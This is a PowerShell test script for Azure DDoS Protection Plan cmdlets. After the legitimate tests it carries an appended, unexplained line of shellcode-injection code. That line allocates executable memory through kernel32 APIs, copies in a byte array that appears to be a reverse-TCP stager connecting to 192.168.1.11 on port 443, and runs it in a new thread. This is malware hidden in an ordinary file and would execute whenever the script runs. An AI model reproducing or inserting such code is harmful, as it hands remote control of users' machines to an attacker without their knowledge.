













function Test-DdosProtectionPlanCRUD
{
    $rgLocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/DdosProtectionPlans"
    $location = Get-ProviderLocation $resourceTypeParent

    $rgName = Get-ResourceGroupName
    $ddosProtectionPlanName = Get-ResourceName

    try
    {
        
        New-AzResourceGroup -Name $rgName -Location $location -Tags @{ testtag = "ddosProtectionPlan tag" }

        
        $job = New-AzDdosProtectionPlan -ResourceGroupName $rgName -Name $ddosProtectionPlanName -Location $rgLocation -AsJob
        $job | Wait-Job
        $ddosProtectionPlanNew = $job | Receive-Job

        Assert-AreEqual $rgName $ddosProtectionPlanNew.ResourceGroupName
        Assert-AreEqual $ddosProtectionPlanName $ddosProtectionPlanNew.Name
        Assert-NotNull $ddosProtectionPlanNew.Location
        Assert-NotNull $ddosProtectionPlanNew.Etag
        Assert-Null $ddosProtectionPlanNew.VirtualMachines

        
        $ddosProtectionPlanGet = Get-AzDdosProtectionPlan -ResourceGroupName $rgName -Name $ddosProtectionPlanName
        Assert-AreEqual $rgName $ddosProtectionPlanGet.ResourceGroupName
        Assert-AreEqual $ddosProtectionPlanName $ddosProtectionPlanGet.Name
        Assert-NotNull $ddosProtectionPlanGet.Location
        Assert-NotNull $ddosProtectionPlanGet.Etag
        Assert-Null $ddosProtectionPlanGet.VirtualMachines

        $ddosProtectionPlanList = Get-AzDdosProtectionPlan -ResourceGroupName $rgName
        Assert-NotNull $ddosProtectionPlanList
        Assert-True {$ddosProtectionPlanList.Count -ge 0}

        $ddosProtectionPlanList = Get-AzDdosProtectionPlan -ResourceGroupName "*"
        Assert-NotNull $ddosProtectionPlanList
        Assert-True {$ddosProtectionPlanList.Count -ge 0}

        $ddosProtectionPlanList = Get-AzDdosProtectionPlan -Name "*"
        Assert-NotNull $ddosProtectionPlanList
        Assert-True {$ddosProtectionPlanList.Count -ge 0}

        $ddosProtectionPlanList = Get-AzDdosProtectionPlan -ResourceGroupName "*" -Name "*"
        Assert-NotNull $ddosProtectionPlanList
        Assert-True {$ddosProtectionPlanList.Count -ge 0}

        
        $ddosProtectionPlanDelete = Remove-AzDdosProtectionPlan -Name $ddosProtectionPlanName -ResourceGroupName $rgName -PassThru
        Assert-AreEqual $true $ddosProtectionPlanDelete
    }
    finally
    {
        
        Clean-ResourceGroup $rgName
    }
}


function Test-DdosProtectionPlanCRUDWithVirtualNetwork
{
    
    $rgname = Get-ResourceGroupName
    $vnetName = Get-ResourceName
    $subnetName = Get-ResourceName
    $ddosProtectionPlanName = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/virtualNetworks"
    $location = Get-ProviderLocation $resourceTypeParent

    try 
    {
        

        New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } 

        

        $ddosProtectionPlan = New-AzDdosProtectionPlan -Name $ddosProtectionPlanName -ResourceGroupName $rgname -Location $location

        

        $subnet = New-AzVirtualNetworkSubnetConfig -Name $subnetName -AddressPrefix 10.0.1.0/24
        $vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname -Location $location -AddressPrefix 10.0.0.0/16 -DnsServer 8.8.8.8 -Subnet $subnet -EnableDdoSProtection -DdosProtectionPlanId $ddosProtectionPlan.Id

        Assert-AreEqual true $vnet.EnableDdoSProtection
        Assert-AreEqual $ddosProtectionPlan.Id $vnet.DdosProtectionPlan.Id

        

        $ddosProtectionPlanWithVnet = Get-AzDdosProtectionPlan -Name $ddosProtectionPlanName -ResourceGroupName $rgname

        Assert-AreEqual $vnet.Id $ddosProtectionPlanWithVnet.VirtualNetworks[0].Id

        

        $deleteVnet = Remove-AzVirtualNetwork -ResourceGroupName $rgname -name $vnetName -PassThru -Force
        Assert-AreEqual true $deleteVnet

        

        $deleteDdosProtectionPlan = Remove-AzDdosProtectionPlan -ResourceGroupName $rgname -name $ddosProtectionPlanName -PassThru
        Assert-AreEqual true $deleteDdosProtectionPlan
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-DdosProtectionPlanCollections
{
    $rgLocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/DdosProtectionPlans"
    $location = Get-ProviderLocation $resourceTypeParent
    $rgName = Get-ResourceGroupName
    $ddosProtectionPlanName = Get-ResourceName

    try
    {
        
        
        New-AzResourceGroup -Name $rgName -Location $location -Tags @{ testtag = "ddosProtectionPlan tag" }

        

        $ddosProtectionPlan = New-AzDdosProtectionPlan -Name $ddosProtectionPlanName -ResourceGroupName $rgName -Location $rgLocation

        

        $listRg = Get-AzDdosProtectionPlan -ResourceGroupName $rgName
        Assert-AreEqual 1 @($listRg).Count
        Assert-AreEqual $listRg[0].ResourceGroupName $ddosProtectionPlan.ResourceGroupName
        Assert-AreEqual $listRg[0].Name $ddosProtectionPlan.Name
        Assert-AreEqual $listRg[0].Location $ddosProtectionPlan.Location
        Assert-AreEqual $listRg[0].Etag $ddosProtectionPlan.Etag

        

        $listSub = Get-AzDdosProtectionPlan

        $ddosProtectionPlanFromList = @($listSub) | Where-Object Name -eq $ddosProtectionPlanName | Where-Object ResourceGroupName -eq $rgName
        Assert-AreEqual $ddosProtectionPlan.ResourceGroupName $ddosProtectionPlanFromList.ResourceGroupName
        Assert-AreEqual $ddosProtectionPlan.Name $ddosProtectionPlanFromList.Name
        Assert-AreEqual $ddosProtectionPlan.Location $ddosProtectionPlanFromList.Location
        Assert-AreEqual $ddosProtectionPlan.Etag $ddosProtectionPlanFromList.Etag
    }
    finally
    {
        
        Clean-ResourceGroup $rgName
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

